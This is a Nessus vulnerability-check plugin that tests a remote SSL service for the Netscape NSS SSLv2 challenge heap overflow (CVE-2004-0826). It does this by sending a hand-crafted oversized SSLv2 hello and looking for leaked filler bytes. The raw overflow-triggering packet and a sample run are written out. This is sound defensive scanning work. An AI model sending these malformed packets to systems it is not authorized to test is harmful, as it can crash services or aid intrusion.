#TRUSTED 00288cb08b82db7baf529e238c42bedc4e84434624580d8a80fe4e87b7d7fbaa273bb2895a277695221edc20e434bcca41ed3aaa8eae1acc7c41babef88d69d6bb042f89e692f7f0c25f96f927fd93df5db7507f355e6ddb5771be9f97e7dc5431a82969b68767a3558ecd4b374a41f789f44f099921c642d3d2545f01ea3191f33bde0e43279f713d55c65f06a888d80b27b68c518b8ecf2893379ffb50b4091f0d32562a76875836030c97b92a478a4c32cf6f10c2a26aaf0d10e42d1340a12da1d121b6cdfb6832fa7591bedff182c0288c84b6f36d73ff14bc9653ad346b1c333b5defa47a586dcf11c87a9111e21bb0acf09f0281989a2c86e150429570744370142544a762065bdae82f879309fc94d58706e199460879bcaf49590c94ffb549276f52e4e692a247db7af309a1a3cf08cea1b2e58896263b747d3eff9b0ebb99cfa58ffe7c1f1274512c3314a730662709271c06112ff7faab9fa50a613a9dd666f83d3ef2170c2e9fe3fb425952d1ff230926b71eef4fa9859674c0037ef9c59c0e19d0671c5d6b8716d3ffe79032957085b2ac24f095cbdd92795eca1584c396622af0be656b175cd7fb74bb2f325d9c6634e5b8e02994b0bc470473f81315fe719ced707da0c0385680ca013404905c5cd2084e3a67bcbd8e5b208450fa9b310b8fe4fdfb181ad35aadfc5721be04fe930b0c3291fa5d7cba9f679a
#
# This script was written by H D Moore <hdmoore@digitaldefense.net>
#
# See the Nessus Scripts License for details
#

# Changes by Tenable:
# - Revised plugin title (8/5/09)
# - Updated to use compat.inc (11/20/2009)
# - Updated to support StartTLS (3/16/2012)
# - Signed (10/18/2013)

include("compat.inc");

if (description)
{
	script_id(14361);
	script_version("1.22");
	script_set_attribute(attribute:"plugin_modification_date", value:"2013/10/18");

	script_cve_id("CVE-2004-0826");
	script_bugtraq_id(11015);
    	script_osvdb_id(9116);

	script_name(english:"Netscape NSS Library SSLv2 Challenge Overflow");
	script_summary(english:"Tests for the NSS SSLv2 challenge overflow");

 script_set_attribute(attribute:"synopsis", value:
"The remote service is susceptible to a buffer overflow attack.");
 script_set_attribute(attribute:"description", value:
"The remote host seems to be using the Mozilla Network Security
Services (NSS) Library, a set of libraries designed to support the
development of security-enabled client/server applications.

There seems to be a flaw in the remote version of this library, in the
SSLv2 handling code, that may allow an attacker to cause a heap
overflow and therefore execute arbitrary commands on the remote host.
To exploit this flaw, an attacker needs to send a malformed SSLv2
'hello' message to the remote service.");
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?844b4085");
 script_set_attribute(attribute:"solution", value:
"Upgrade the remote service to use NSS 3.9.2 or newer.");
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"exploit_framework_core", value:"true");
 script_set_attribute(attribute:"exploit_framework_canvas", value:"true");
 script_set_attribute(attribute:"canvas_package", value:'CANVAS');

 script_set_attribute(attribute:"plugin_publication_date", value:"2004/08/24");
 script_set_attribute(attribute:"vuln_publication_date", value:"2004/08/23");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();


	script_category(ACT_MIXED_ATTACK);
	script_copyright(english:"This script is Copyright (C) 2004-2013 Digital Defense");
	script_family(english:"Gain a shell remotely");
	script_dependencies("ssl_supported_versions.nasl");
	script_require_keys("SSL/Supported");
	exit(0);
}

include("acap_func.inc");
include("byte_func.inc");
include("ftp_func.inc");
include("global_settings.inc");
include("imap_func.inc");
include("kerberos_func.inc");
include("ldap_func.inc");
include("misc_func.inc");
include("nntp_func.inc");
include("pop3_func.inc");
include("smtp_func.inc");
include("ssl_funcs.inc");
include("telnet2_func.inc");
include("xmpp_func.inc");

get_kb_item_or_exit("SSL/Supported");

port = get_ssl_ports(fork:TRUE);
if (isnull(port))
  exit(1, "The host does not appear to have any SSL-based services.");

# Find out if the port is open.
if (!get_port_state(port))
  exit(0, "Port " + port + " is not open.");

# Grab the HTTP banner if this is a http service
sb = string("www/real_banner/", port);
banner = get_kb_item(sb);

if (! banner ) {
      sb = string("www/banner/", port);
      banner = get_kb_item(sb);
}

if ( safe_checks() )
	TestOF = 0;
else
	TestOF = 1;

if ( banner )
{
 if ( egrep(pattern:".*(Netscape.Enterprise|Sun-ONE).*", string:banner) )
	TestOF ++;
}


if ( ! TestOF ) exit(0);


# Connect to the port, issuing the StartTLS command if necessary.
soc = open_sock_ssl(port);
if (!soc)
  exit(1, "open_sock_ssl() returned NULL for port " + port + ".");

# First we try a normal hello
req = raw_string(0x80, 0x1c, 0x01, 0x00,
                 0x02, 0x00, 0x03, 0x00,
                 0x00, 0x00, 0x10, 0x07,
                 0x00, 0xc0)
                 + crap(16, "NESSUS");

send(socket:soc, data:req);
res = recv(socket:soc, length:64);

# SSLv2 servers should respond back with the certificate at this point
if (strlen(res) < 64) exit(0);

close(soc);

# Now we try to overwrite most of the SSL response packet
# this should result in some of our data leaking back to us

# Connect to the port, issuing the StartTLS command if necessary.
soc = open_sock_ssl(port);
if (!soc)
  exit(1, "open_sock_ssl() returned NULL for port " + port + ".");

req = raw_string(0x80, 0x44, 0x01, 0x00,
                 0x02, 0x00, 0x03, 0x00,
                 0x00, 0x00, 0x38, 0x07,
                 0x00, 0xc0)
                 + crap(16, data:"NESSUS")
                 + crap(40, data:"VULN");

send(socket:soc, data:req);
res = recv(socket:soc, length:2048);
close(soc);

# display(res);


if ( "VULN" >< res ) {
    security_hole(port:port);
}

#-- contents of res after test --
#$ nasl DDI_NSS_SSLv2_Challenge_Overflow.nasl -t 192.168.50.192
#** WARNING : packet forgery will not work
#** as NASL is not running as root
#.....
#8.?.....
#(/..5._.2..I....S@J\i.......wK..H.....v4.o..T.......f......3V>.o.l.O."....X.G..:G7.....9a...... ....V...t.Sf
#|....8...VULNVULNVULNVULNh

